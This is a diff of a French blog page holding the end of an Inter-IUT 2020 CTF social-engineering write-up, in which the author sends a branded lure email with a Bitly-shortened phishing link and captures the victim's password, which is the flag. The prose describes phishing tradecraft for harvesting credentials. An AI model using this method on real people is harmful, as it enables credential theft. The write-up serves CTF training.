 <p>Quelques minutes plus tard, l&rsquo;adresse &ldquo;news.lepetitvapoteur[at]gmail.com&rdquo; voit le jour.
 Afin de cacher le lien complet vers l&rsquo;URL de notre page, qui est un peu moche car de la forme &ldquo;hxxp://111.222.333.444:8000/index.html&rdquo;, nous pouvons utiliser un URL Shortener tel que Bitly (Quitte à faire du quick&amp;dirty, autant y aller à fond!) puis on créé un petit mail aguicheur en ajoutant le logo de notre leurre (crédibilité, toussa&hellip;).</p>
-
-<p><center><img src="/img/writeups/inter-iut-2020/OSINT_6.png" alt="OSINT_SE_6" class="imgSize2"/></center></p>
-
+<!-- raw HTML omitted -->
 <p>Tout est prêt !
-<br/></p>
-
+<!-- raw HTML omitted --></p>
 <h2 id="phish-and-flag">Phish and Flag</h2>
-
 <p>Le serveur est lancé et le mail est prêt, ce dernier peut donc partir, à 11h46.
 À partir de là, telle une partie de pêche, il suffit d&rsquo;attendre. À peine 2 minutes plus tard, on observe une première connexion sur le serveur, mais sans idenfiants.</p>
-
-<p><center><img src="/img/writeups/inter-iut-2020/OSINT_7.png" alt="OSINT_SE_7" class="imgSize2"/></center></p>
-
+<!-- raw HTML omitted -->
 <p>Les minutes passent et toujours rien. Sentiment connu de tout auditeur/consultant ayant déjà réalisé de réelles campagnes : &ldquo;Mince.. Est-ce que le formulaire fonctionne ? Est-ce que le site n&rsquo;est pas cassé ?&rdquo;.</p>
-
 <p>Mais finalement, à 13h14, la même adresse IP revient taper notre serveur et notre victime tente de se connecter, révélant ainsi son mot de passe qui n&rsquo;est autre que le flag !</p>
-
-<p><center><img src="/img/writeups/inter-iut-2020/OSINT_8.png" alt="OSINT_SE_8" class="imgSize2"/></center></p>
-
+<!-- raw HTML omitted -->
 <p>w00t !</p>
-
 <p>Un dernier mot.
 Je l&rsquo;ai répété plusieurs durant ce poste, mais il va de soit qu&rsquo;utiliser un serveur HTTP python de la sorte, c&rsquo;est moche et ça peut même être dangereux. Je l&rsquo;ai fait pour ce challenge car aucune donnée n&rsquo;était stockée sur le serveur (en cas de compromission) et car je savais que le serveur en question n&rsquo;allait être disponible que quelques minutes.</p>
   </div>
@@ -486,7 +439,7 @@ Je l&rsquo;ai répété plusieurs durant ce poste, mais il va de soit qu&rsquo;u
 var doNotTrack = false;
 if (!doNotTrack) {
 	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
-	ga('create', 'UA-126182747-1', 'auto');
+	ga('create', 'G-GB7QC0EDF8', 'auto');
 	
 	ga('send', 'pageview');
 }
